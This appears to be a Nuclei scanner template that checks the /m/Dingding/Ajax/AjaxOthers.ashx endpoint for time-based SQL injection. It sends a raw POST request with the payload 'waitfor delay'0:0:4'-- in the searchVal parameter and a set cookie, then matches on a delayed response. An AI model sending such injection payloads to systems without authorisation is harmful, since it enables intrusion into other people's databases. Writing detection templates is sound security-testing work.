id: sqli-time-delay-check

info:
  name: SQL Injection Time Delay Check
  author: ProjectDiscoveryAI
  severity: high
  description: |
    This template checks for SQL Injection vulnerabilities using time delay payloads in the `searchVal` parameter of specific POST requests.

http:
  - raw:
      - |
        POST /m/Dingding/Ajax/AjaxOthers.ashx HTTP/1.1
        Host: {{Hostname}}
        Cookie: UserCookie={"empId":"1"}
        Content-Type: application/x-www-form-urlencoded

        action=GetCheckRepeatData&searchVal='waitfor delay'0:0:4'--&type=customer

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "duration > 4000"